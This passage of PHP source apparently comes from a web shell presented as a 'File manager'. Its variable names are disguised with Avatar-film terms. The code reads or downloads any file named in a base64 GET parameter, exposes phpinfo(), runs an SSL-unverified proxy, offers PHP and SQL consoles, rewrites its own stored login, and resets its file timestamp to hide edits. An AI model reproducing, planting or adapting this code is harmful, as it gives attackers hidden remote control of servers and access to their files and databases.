			$replaceJake = str_replace('{"'.$bondMatches[1].'"}',$loginToAvatarForm,$eywaFileContent);
			if (file_put_contents(__FILE__, $replaceJake)) {
				$eywaMessage .= __('File updated');
				if ($_POST['fm_login']['login'] != $neytiriAuthenticated['login']) $eywaMessage .= ' '.__('Login').': '.$_POST['fm_login']['login'];
				if ($_POST['fm_login']['password'] != $neytiriAuthenticated['password']) $eywaMessage .= ' '.__('Password').': '.$_POST['fm_login']['password'];
				$neytiriAuthenticated = $_POST['fm_login'];
			}


			else $eywaMessage .= __('Error occurred');

			if (!empty($pandoraConfig['fm_restore_time'])) touch(__FILE__,$pandoraFileModified);
		}

	} elseif (isset($_POST['tpl_edited'])) { 



		$naViLanguageTemplate = $_POST['tpl_edited'];
		if (!empty($_POST[$naViLanguageTemplate.'_name'])) {
			$eywaPanel = json_encode(array_combine($_POST[$naViLanguageTemplate.'_name'],$_POST[$naViLanguageTemplate.'_value']),JSON_HEX_APOS);


		} elseif (!empty($_POST[$naViLanguageTemplate.'_new_name'])) {



			$eywaPanel = json_encode(json_decode(${$naViLanguageTemplate.'_templates'},true)+array($_POST[$naViLanguageTemplate.'_new_name']=>$_POST[$naViLanguageTemplate.'_new_value']),JSON_HEX_APOS);

		}


		if (!empty($eywaPanel)) {
			$eywaFileContent = file_get_contents(__FILE__);

			$searchEywa = preg_match('#'.$naViLanguageTemplate.'_templates[\s]?\=[\s]?\'\{\"(.*?)\"\}\';#', $eywaFileContent, $bondMatches);
			if (!empty($bondMatches[1])) {



				$pandoraFileModified = filemtime(__FILE__);



				$replaceJake = str_replace('{"'.$bondMatches[1].'"}',$eywaPanel,$eywaFileContent);


				if (file_put_contents(__FILE__, $replaceJake)) {
					${$naViLanguageTemplate.'_templates'} = $eywaPanel;
					$eywaMessage .= __('File updated');

				} else $eywaMessage .= __('Error occurred');
				if (!empty($pandoraConfig['fm_restore_time'])) touch(__FILE__,$pandoraFileModified);
			}	
		} else $eywaMessage .= __('Error occurred');



	}
}

// Just show image
if (isset($_GET['img'])) {
	$avatarFile=base64_decode($_GET['img']);


	if ($eywaInfo=getimagesize($avatarFile)){
		switch  ($eywaInfo[2]){	//1=GIF, 2=JPG, 3=PNG, 4=SWF, 5=PSD, 6=BMP

			case 1: $naViExtension='gif'; break;


			case 2: $naViExtension='jpeg'; break;
			case 3: $naViExtension='png'; break;


			case 6: $naViExtension='bmp'; break;
			default: die();
		}


		header("Content-type: image/$naViExtension");
		echo file_get_contents($avatarFile);



		die();

	}
}







// Just download file

if (isset($_GET['download'])) {



	$avatarFile=base64_decode($_GET['download']);

	downloadEywaFile($avatarFile);	



}





// They can climb trees and swim in rivers



if (isset($_GET['phpinfo'])) {
	phpinfo(); 

	die();


}



// Mini proxy, many bugs!
if (isset($_GET['proxy']) && (!empty($pandoraConfig['enable_proxy']))) {
	$hometreeUrl = isset($_GET['url'])?urldecode($_GET['url']):'';
	$proxyEywaForm = '

<div style="position:relative;z-index:100500;background: linear-gradient(to bottom, #e4f5fc 0%,#bfe8f9 50%,#9fd8ef 51%,#2ab0ed 100%);">


	<form action="" method="GET">
	<input type="hidden" name="proxy" value="true">
	'.pandoraHome().' <a href="'.$hometreeUrl.'" target="_blank">Url</a>: <input type="text" name="url" value="'.$hometreeUrl.'" size="55">
	<input type="submit" value="'.__('Show').'" class="fm_input">
	</form>
</div>



';

	if ($hometreeUrl) {



		$omatikayaChannel = curl_init($hometreeUrl);


		curl_setopt($omatikayaChannel, CURLOPT_USERAGENT, 'Den1xxx test proxy');



		curl_setopt($omatikayaChannel, CURLOPT_FOLLOWLOCATION, 1);


		curl_setopt($omatikayaChannel, CURLOPT_SSL_VERIFYHOST,0);
		curl_setopt($omatikayaChannel, CURLOPT_SSL_VERIFYPEER,0);


		curl_setopt($omatikayaChannel, CURLOPT_HEADER, 0);
		curl_setopt($omatikayaChannel, CURLOPT_REFERER, $hometreeUrl);


		curl_setopt($omatikayaChannel, CURLOPT_RETURNTRANSFER,true);
		$avatarResult = curl_exec($omatikayaChannel);

		curl_close($omatikayaChannel);

		//$avatarResult = preg_replace('#(src)=["\'][http://]?([^:]*)["\']#Ui', '\\1="'.$hometreeUrl.'/\\2"', $avatarResult);
		$avatarResult = preg_replace_callback('#(href|src)=["\'][http://]?([^:]*)["\']#Ui', 'pandoraUrlProxy', $avatarResult);

		$avatarResult = preg_replace('%(<body.*?>)%i', '$1'.'<style>'.eywaHomeStyle().'</style>'.$proxyEywaForm, $avatarResult);
		echo $avatarResult;

		die();
	} 
}
?>
<!doctype html>
<html>

<head>     


	<meta charset="utf-8" />



	<meta name="viewport" content="width=device-width, initial-scale=1" />
    <title><?=__('File manager')?></title>
<style>

body {



	background-color:	white;
	font-family:		Verdana, Arial, Helvetica, sans-serif;
	font-size:			8pt;
	margin:				0px;

}






a:link, a:active, a:visited { color: #006699; text-decoration: none; }
a:hover { color: #DD6900; text-decoration: underline; }

a.th:link { color: #FFA34F; text-decoration: none; }

a.th:active { color: #FFA34F; text-decoration: none; }

a.th:visited { color: #FFA34F; text-decoration: none; }
a.th:hover {  color: #FFA34F; text-decoration: underline; }

table.bg {
	background-color: #ACBBC6
}



th, td { 
	font:	normal 8pt Verdana, Arial, Helvetica, sans-serif;
	padding: 3px;



}



th	{
	height:				25px;
	background-color:	#006699;


	color:				#FFA34F;

	font-weight:		bold;


	font-size:			11px;
}

.row1 {


	background-color:	#EFEFEF;


}





.row2 {


	background-color:	#DEE3E7;
}

.row3 {


	background-color:	#D1D7DC;

	padding: 5px;


}

tr.row1:hover {
	background-color:	#F3FCFC;
}

tr.row2:hover {

	background-color:	#F0F6F6;



}




.whole {

	width: 100%;
}

.all tbody td:first-child{width:100%;}


textarea {


	font: 9pt 'Courier New', courier;
	line-height: 125%;

	padding: 5px;
}



.textarea_input {
	height: 1em;



}


.textarea_input:focus {



	height: auto;

}



input[type=submit]{
	background: #FCFCFC none !important;



	cursor: pointer;
}


.folder {


    background-image: url("data:image/png;base64,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");


}




.file {



    background-image: url("data:image/png;base64,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");


}
<?=eywaHomeStyle()?>


.img {
	background-image: 
url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAAdFQTFRF7e3t/f39pJ+f+cJajV8q6enpkGIm/sFO/+2O393c5ubm/sxbd29yimdneFg65OTk2zoY6uHi1zAS1crJsHs2nygo3Nrb2LBXrYtm2p5A/+hXpoRqpKOkwri46+vr0MG36Ysz6ujpmI6AnzUywL+/mXVSmIBN8bwwj1VByLGza1ZJ0NDQjYSB/9NjwZ6CwUAsxk0brZyWw7pmGZ4A6LtdkHdf/+N8yow27b5W87RNLZL/2biP7wAA//GJl5eX4NfYsaaLgp6h1b+t/+6R68Fe89ycimZd/uQv3r9NupCB99V25a1cVJbbnHhO/8xS+MBa8fDwi2Ji48qi/+qOdVIzs34x//GOXIzYp5SP/sxgqpiIcp+/siQpcmpstayszSANuKKT9PT04uLiwIky8LdE+sVWvqam8e/vL5IZ+rlH8cNg08Ccz7ad8vLy9LtU1qyUuZ4+r512+8s/wUpL3d3dx7W1fGNa/89Z2cfH+s5n6Ojob1Yts7Kz19fXwIg4p1dN+Pj4zLR0+8pd7strhKAs/9hj/9BV1KtftLS1np2dYlJSZFVV5LRWhEFB5rhZ/9Jq0HtT//CSkIqJ6K5D+LNNblVVvjM047ZMz7e31xEG////tKgu6wAAAJt0Uk5T/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////wCVVpKYAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAANZJREFUKFNjmKWiPQsZMMximsqPKpAb2MsAZNjLOwkzggVmJYnyps/QE59eKCEtBhaYFRfjZuThH27lY6kqBxYorS/OMC5wiHZkl2QCCVTkN+trtFj4ZSpMmawDFBD0lCoynzZBl1nIJj55ElBA09pdvc9buT1SYKYBWw1QIC0oNYsjrFHJpSkvRYsBKCCbM9HLN9tWrbqnjUUGZG1AhGuIXZRzpQl3aGwD2B2cZZ2zEoL7W+u6qyAunZXIOMvQrFykqwTiFzBQNOXj4QKzoAKzajtYIQwAlvtpl3V5c8MAAAAASUVORK5CYII=");
}



@media screen and (max-width:720px){
  table{display:block;}

    #fm_table td{display:inline;float:left;}

    #fm_table tbody td:first-child{width:100%;padding:0;}
    #fm_table tbody tr:nth-child(2n+1){background-color:#EFEFEF;}
    #fm_table tbody tr:nth-child(2n){background-color:#DEE3E7;}

    #fm_table tr{display:block;float:left;clear:left;width:100%;}

	#header_table .row2, #header_table .row3 {display:inline;float:left;width:100%;padding:0;}

	#header_table table td {display:inline;float:left;}
}
</style>

</head>
<body>
<?php
$includedNeytiriUrl = '?fm=true';
if (isset($_POST['sqlrun'])&&!empty($pandoraConfig['enable_sql_console'])){


	$eywaResult = empty($_POST['sql']) ? '' : $_POST['sql'];



	$naViResponseLanguage = 'sql';
} elseif (isset($_POST['phprun'])&&!empty($pandoraConfig['enable_php_console'])){



	$eywaResult = empty($_POST['php']) ? '' : $_POST['php'];
	$naViResponseLanguage = 'php';
} 

if (isset($_GET['fm_settings'])) {



	echo ' 
<table class="whole">



<form method="post" action="">



<tr><th colspan="2">'.__('File manager').' - '.__('Settings').'</th></tr>
'.(empty($eywaMessage)?'':'<tr><td class="row2" colspan="2">'.$eywaMessage.'</td></tr>').'


'.pandoraConfigCheckboxRow(__('Show size of the folder'),'show_dir_size').'
'.pandoraConfigCheckboxRow(__('Show').' '.__('pictures'),'show_img').'



'.pandoraConfigCheckboxRow(__('Show').' '.__('Make directory'),'make_directory').'
'.pandoraConfigCheckboxRow(__('Show').' '.__('New file'),'new_file').'
'.pandoraConfigCheckboxRow(__('Show').' '.__('Upload'),'upload_file').'
'.pandoraConfigCheckboxRow(__('Show').' PHP version','show_php_ver').'



'.pandoraConfigCheckboxRow(__('Show').' PHP ini','show_php_ini').'

'.pandoraConfigCheckboxRow(__('Show').' '.__('Generation time'),'show_gt').'

'.pandoraConfigCheckboxRow(__('Show').' xls','show_xls').'

'.pandoraConfigCheckboxRow(__('Show').' PHP '.__('Console'),'enable_php_console').'


'.pandoraConfigCheckboxRow(__('Show').' SQL '.__('Console'),'enable_sql_console').'


<tr><td class="row1"><input name="fm_config[sql_server]" value="'.$pandoraConfig['sql_server'].'" type="text"></td><td class="row2 whole">SQL server</td></tr>
<tr><td class="row1"><input name="fm_config[sql_username]" value="'.$pandoraConfig['sql_username'].'" type="text"></td><td class="row2 whole">SQL user</td></tr>
<tr><td class="row1"><input name="fm_config[sql_password]" value="'.$pandoraConfig['sql_password'].'" type="text"></td><td class="row2 whole">SQL password</td></tr>
<tr><td class="row1"><input name="fm_config[sql_db]" value="'.$pandoraConfig['sql_db'].'" type="text"></td><td class="row2 whole">SQL DB</td></tr>
'.pandoraConfigCheckboxRow(__('Show').' Proxy','enable_proxy').'
'.pandoraConfigCheckboxRow(__('Show').' phpinfo()','show_phpinfo').'

'.pandoraConfigCheckboxRow(__('Show').' '.__('Settings'),'fm_settings').'
'.pandoraConfigCheckboxRow(__('Restore file time after editing'),'restore_time').'

'.pandoraConfigCheckboxRow(__('File manager').': '.__('Restore file time after editing'),'fm_restore_time').'
<tr><td class="row3"><a href="'.getPandoraUrl().'?fm_settings=true&fm_config_delete=true">'.__('Reset settings').'</a></td><td class="row3"><input type="submit" value="'.__('Save').'" name="fm_config[fm_set_submit]"></td></tr>

</form>
</table>

<table>


<form method="post" action="">
<tr><th colspan="2">'.__('Settings').' - '.__('Authorization').'</th></tr>
<tr><td class="row1"><input name="fm_login[authorize]" value="1" '.($neytiriAuthenticated['authorize']?'checked':'').' type="checkbox" id="auth"></td><td class="row2 whole"><label for="auth">'.__('Authorization').'</label></td></tr>



<tr><td class="row1"><input name="fm_login[login]" value="'.$neytiriAuthenticated['login'].'" type="text"></td><td class="row2 whole">'.__('Login').'</td></tr>



<tr><td class="row1"><input name="fm_login[password]" value="'.$neytiriAuthenticated['password'].'" type="text"></td><td class="row2 whole">'.__('Password').'</td></tr>

<tr><td class="row1"><input name="fm_login[cookie_name]" value="'.$neytiriAuthenticated['cookie_name'].'" type="text"></td><td class="row2 whole">'.__('Cookie').'</td></tr>
<tr><td class="row1"><input name="fm_login[days_authorization]" value="'.$neytiriAuthenticated['days_authorization'].'" type="text"></td><td class="row2 whole">'.__('Days').'</td></tr>



<tr><td class="row1"><textarea name="fm_login[script]" cols="35" rows="7" class="textarea_input" id="auth_script">'.$neytiriAuthenticated['script'].'</textarea></td><td class="row2 whole">'.__('Script').'</td></tr>
<tr><td colspan="2" class="row3"><input type="submit" value="'.__('Save').'" ></td></tr>


</form>



</table>';
echo pandoraTemplateForm('php'),pandoraTemplateForm('sql');
} elseif (isset($proxyEywaForm)) {
	die($proxyEywaForm);
} elseif (isset($naViResponseLanguage)) {	


?>



<table class="whole">



<tr>



    <th><?=__('File manager').' - '.$avatarPath?></th>
</tr>

<tr>


    <td class="row2"><table><tr><td><h2><?=strtoupper($naViResponseLanguage)?> <?=__('Console')?><?php
	if($naViResponseLanguage=='sql') echo ' - Database: '.$pandoraConfig['sql_db'].'</h2></td><td>'.runPandoraInput('php');


	else echo '</h2></td><td>'.runPandoraInput('sql');



	?></td></tr></table></td>



</tr>


<tr>
    <td class="row1">
		<a href="<?=$includedNeytiriUrl.'&path=' . $avatarPath;?>"><?=__('Back')?></a>

